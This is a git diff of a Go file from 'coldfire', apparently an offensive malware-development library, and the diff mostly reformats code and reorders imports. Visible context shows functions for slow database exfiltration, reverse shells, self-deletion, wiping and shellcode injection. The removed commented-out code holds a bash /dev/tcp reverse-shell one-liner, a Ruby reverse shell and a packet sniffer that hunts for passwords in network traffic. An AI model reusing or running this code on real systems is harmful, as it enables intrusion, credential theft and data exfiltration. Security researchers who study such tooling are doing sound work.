@@ -5,6 +5,7 @@ package coldfire
 
 import (
 	"bufio"
+	"database/sql"
 	"encoding/binary"
 	"fmt"
 	"net"
@@ -15,13 +16,12 @@ import (
 	"strconv"
 	"strings"
 	"time"
-    "database/sql"
 
-    _ "github.com/lib/pq"
-	"github.com/fatih/color"
 	"github.com/GeertJohan/yubigo"
-    _ "github.com/go-sql-driver/mysql"
-	//"github.com/secsy/goftp"
+	"github.com/fatih/color"
+	_ "github.com/go-sql-driver/mysql"
+	_ "github.com/lib/pq"
+
 	"github.com/ztrue/tracerr"
 )
 
@@ -32,7 +32,7 @@ var (
 	Bold    = color.New(color.Bold).SprintFunc()
 	Yellow  = color.New(color.FgYellow).SprintFunc()
 	Magenta = color.New(color.FgMagenta).SprintFunc()
-	tmpbuf []byte 
+	tmpbuf  []byte
 )
 
 func handleReverse(conn net.Conn) {
@@ -103,13 +103,12 @@ func IsFileExec(file string) bool {
 	return mode&0111 != 0
 }
 
-
 // Exfiltrates data slowly from either MySQL or Postgres
-func HarvestDB(ip, username, password string, port int){
-	if PortscanSingle(ip, 5400){
+func HarvestDB(ip, username, password string, port int) {
+	if PortscanSingle(ip, 5400) {
 
 	}
-	if PortscanSingle(ip, 3306){
+	if PortscanSingle(ip, 3306) {
 		db, err := sql.Open("mysql", F("%s:%s@tcp(%s:3306)/test", username, password, ip))
 		Check(err)
 		defer db.Close()
@@ -126,52 +125,18 @@ func ListDB(db *sql.DB, tables bool) []string {
 	var result []string
 	var table string
 	for res.Next() {
-    	res.Scan(&table)
-    	result = append(result, table)
+		res.Scan(&table)
+		result = append(result, table)
 	}
 	return result
 }
-
-// Generates a reverse shell in a given language to the current machine on arbitrary port
-/*func LangRevshell(language string, port int, global bool) string {
-	reverse_addr := GetLocalIP()
-	if (global){
-		reverse_addr = GetGlobalIP()	
-	}
-	rshell := ""
-	switch (language){
-	case "rb":
-		rshell = F("require 'socket';spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"%s\",%d))", reverse_addr, port)
-	case "sh":
-		rshell = F("bash -i >& /dev/tcp/%s/%d 0>&1", reverse_addr, port)
-	}
-	return rshell
-}
-
-// Ta funkcja wpierdala gratisa na FTP
-func Gratis(ip, username, password string, port int) {
-    config := goftp.Config{
-        User:               username,
-        Password:           password,
-        ConnectionsPerHost: port,
-        Timeout:            20 * time.Second,
-        Logger:             os.Stderr,
-    }
-    connection, err := goftp.DialConfig(config, ip)
-	Check(err)
-	listing, err := connection.ReadDir("/")
-	Check(err)
-    for _, file := range listing {
-        _ = file.Name()
-    }
-}*/
 
 // Verifies Yubico OTP
 func Yubi(id, token, otp string) bool {
 	yubikey, err := yubigo.NewYubiAuth(id, token)
 	Check(err)
 	res, ok, err := yubikey.Verify(otp)
-	if (err != nil || ! ok || res == nil) {
+	if err != nil || !ok || res == nil {
 		return false
 	}
 	return true
@@ -257,51 +222,6 @@ func Remove() {
 	os.Remove(os.Args[0])
 }
 
-// CredentialsSniff is used to sniff network traffic for
-// private user information.
-/*func CredentialsSniff(ifac, interval string,
-	collector chan string,
-	words []string) error {
-	ifs := []string{}
-	if ifac != "all" {
-		ifs = []string{ifac}
-	} else {
-		ifs = append(ifs, ifs...)
-	}
-	hits := []string{"password", "user",
-		"username", "secrets", "auth"}
-	for w := range words {
-		word := words[w]
-		hits = append(hits, word)
-	}
-	for h := range hits {
-		hit := hits[h]
-		hits = append(hits, strings.ToUpper(hit))
-		hits = append(hits, strings.ToUpper(string(hit[0]))+string(hit[1:]))
-	}
-	var snapshot_len int32 = 1024
-	var timeout time.Duration = time.Duration(IntervalToSeconds(interval)) * time.Second
-	for _, i := range ifs {
-		handler, err := pcap.OpenLive(i, snapshot_len, false, timeout)
-		if err != nil {
-			return err
-		}
-		defer handler.Close()
-		source := gopacket.NewPacketSource(handler, handler.LinkType())
-		for p := range source.Packets() {
-			app_layer := p.ApplicationLayer()
-			pay := app_layer.Payload()
-			for h := range hits {
-				hit := hits[h]
-				if bytes.Contains(pay, []byte(hit)) {
-					collector <- string(pay)
-				}
-			}
-		}
-	}
-	return nil
-}*/
-
 // Reverse initiates a reverse shell to a given host:port.
 func Reverse(host string, port int) {
 	conn, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
@@ -358,7 +278,6 @@ func Wipe() error {
 	return wipe()
 }
 
-
 // Checks if a string contains valuable information through regex.
 func RegexMatch(regex_type, str string) bool {
 	regexes := map[string]string{
@@ -388,6 +307,6 @@ func AutoDoc(port ...int) {
 }
 
 // Injects a bytearray into current process and executes it
-func RunShellcode(sc []byte, bg bool){
+func RunShellcode(sc []byte, bg bool) {
 	runShellcode(sc, bg)
 }
